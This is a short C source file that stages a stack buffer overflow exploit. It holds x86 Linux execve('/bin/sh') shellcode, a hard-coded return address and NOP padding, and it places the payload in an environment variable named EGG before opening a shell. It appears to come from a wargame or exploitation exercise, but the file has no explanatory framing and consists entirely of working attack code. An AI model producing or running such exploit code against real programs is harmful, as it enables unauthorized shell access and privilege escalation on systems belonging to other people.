#include <string.h>
#include <stdlib.h>
#include <stdio.h>

char shellcode[]=
"\x31\xc0"                     
"\x50"                        
"\x68\x6e\x2f\x73\x68"        
"\x68\x2f\x2f\x62\x69"        
"\x89\xe3"                     
"\x99"                         
"\x52"
"\x53"                         
"\x89\xe1"                     
"\xb0\x0b"                     
"\xcd\x80";                    
char retaddr[] = "\xa8\xd5\xff\xff";
#define NOP 0x90
int main() {
	char buffer[96];

	memset(buffer, NOP, 96);
	memcpy(buffer, "EGG=",4);
	memcpy(buffer+4,shellcode,24);
	memcpy(buffer+88,retaddr,4);
	memcpy(buffer+92, "\x00\x00\x00\x00",4);
	putenv(buffer);
	printf("%p\n", buffer);
	system("/bin/sh");
	return 0;
}
